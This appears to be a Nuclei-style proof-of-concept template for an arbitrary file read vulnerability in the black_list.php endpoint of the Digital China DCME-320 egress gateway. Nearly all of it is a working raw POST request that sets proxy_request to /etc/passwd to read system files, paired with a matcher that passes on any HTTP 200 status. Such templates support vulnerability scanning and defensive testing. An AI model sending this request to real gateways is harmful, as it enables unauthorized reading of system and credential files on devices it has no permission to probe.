id: poc-rh2gvg8qgdcns7tq
info:
  name: 神州数码 DCME-320出口网关 black_list.php 存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: lfi,2025
http:
- raw:
  - 'POST /function/auth/user/black_list.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Content-Type: application/x-www-form-urlencoded

    Connection: close


    proxy_request=/etc/passwd'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
